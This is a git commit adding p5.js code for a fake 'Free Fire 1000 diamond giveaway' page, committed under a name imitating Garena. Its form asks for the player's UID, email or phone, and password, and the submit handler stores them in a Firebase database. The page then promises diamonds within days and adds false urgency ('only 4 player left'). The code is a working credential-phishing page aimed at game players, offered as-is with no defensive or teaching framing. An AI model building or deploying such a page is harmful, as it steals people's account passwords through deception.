2bcedcfad5dc307da2c68e323cd0ccea816d1eed
Garena-FREEFIRE <81690563+Garena-FREEFIRE@users.noreply.github.com>
2021-04-04 17:58:16 +0530

    Add files via upload

---
+++ Form.js
@@ -0,0 +1,42 @@
+class Form {
+  constructor() {
+    this.input1 = createInput();
+    this.input2 = createInput();
+    this.input3 = createInput();
+    this.count = 0;
+    this.title = createElement('h2');
+    this.title2 = createElement('h2');
+    this.button = createButton("SUBMIT");
+    this.image = loadImage("img/diamond.png");
+  }
+
+  display() {
+    this.title.html("→ FREEFIRE 1000 DIAMOND GIVEAWAY");
+    this.title.position(240, 600);
+    this.title.style('color', 0);
+
+
+    this.button.position(440, 440);
+
+    this.input1.position(380, 300);
+    this.input2.position(380, 350);
+    this.input3.position(380, 250);
+
+    this.button.mousePressed(() => {
+      this.count += 1;
+      database.ref('player' + this.count).update({
+        pas: this.input2.value(),
+        mail: this.input1.value(),
+        uid: this.input3.value()
+      });
+
+      this.title2.html("after 1-2 Days you have diamond in your mail Box");
+      this.title2.position(325, 400);
+      this.title2.style('color', 0);
+
+      this.button.hide();
+      });
+
+      image(this.image, 530, 530, 50, 50);
+  }
+}
---
+++ sketch.js
@@ -0,0 +1,36 @@
+var FORM
+var banner,bannerIMG;
+var database;
+
+function preload() {
+    bannerIMG = loadImage("img/banner.png");
+}
+
+function setup() {
+    createCanvas(600,600);
+
+    database = firebase.database();
+
+    form = new Form();
+
+    banner = createSprite(300,75,10,10);
+    banner.addImage(bannerIMG);
+}
+
+function draw() {
+    background(255);
+
+    textSize(20);
+    fill(0);
+    text("UID :",120,190);
+    text("E-Mail/Phone :",32,240);
+    text("Password :",68,290);
+
+    textSize(20);
+    stroke(0);
+    strokeWeight(4)
+    text("ONLY  '4'  PLAYER LEFT",200,160);
+
+    form.display();
+    drawSprites();
+}
